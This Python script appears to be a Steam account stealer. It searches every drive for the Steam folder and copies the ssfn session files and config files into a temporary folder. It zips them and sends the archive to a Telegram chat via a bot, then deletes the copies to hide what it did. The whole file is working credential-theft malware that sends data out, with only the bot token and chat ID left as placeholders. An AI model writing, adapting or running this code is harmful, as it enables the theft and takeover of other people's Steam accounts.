import os
import re
import shutil
import telebot

bot = telebot.TeleBot(token="YOUR_TOKEN")
CHAT_ID = "YOUR_CHAT_ID"

drives = [ chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":") ]
def steam_search(drives):
    for drive in drives:
        for root,dirs,file in os.walk(drive):
            if root.find("Steam") >=1:
                for file in os.listdir(root):
                    if file == "steam.exe":
                        return root
steam_path = steam_search(drives)
if steam_path != None:
    try:
        os.mkdir(steam_path+"\\temp")
    except:
        pass
    try:
        os.mkdir(steam_path + "\\temp\\config")
    except:
        pass
    temp_f = steam_path+"\\temp"
    temp_f_c = steam_path + "\\temp\\config"
    for file_name in os.listdir(steam_path):
        if re.match("ssfn",file_name):
            filep = steam_path + f"\\{file_name}"
            file = open(filep,"rb")
            fileb = file.read()
            copy_file = open(temp_f+f"\\{file_name}","wb+")
            copy_file.write(fileb)
            file.close()
            copy_file.close()
        elif re.match("config",file_name):
            config_p = steam_path + f"\\config"
            for file_name in os.listdir(config_p):
                filep = config_p + f"\\{file_name}"
                file = open(filep, "rb")
                copy_file = open(temp_f_c + f"\\{file_name}", "wb+")
                copy_file.write(file.read())
                file.close()
                copy_file.close()
    temp = os.environ['temp']
    shutil.make_archive(temp+"\\Temp","zip",temp_f)
    for file in os.listdir(temp_f_c.replace(":",":\\")):
        try:
            os.remove(temp_f_c.replace(":",":\\")+"\\"+file)
        except:
            pass
    for file in os.listdir(temp_f.replace(":",":\\")):
        try:
            os.remove(temp_f.replace(":",":\\")+"\\"+file)
        except:
            pass
    os.rmdir(steam_path.replace(":",":\\")+"\\temp\\config\\")
    os.rmdir(steam_path.replace(":",":\\")+"\\temp\\")
    send_file = open(temp+"\\Temp.zip","rb")
    bot.send_document(int(CHAT_ID), send_file)
    send_file.close()
    os.remove(temp+"\\Temp.zip")
else:
    pass
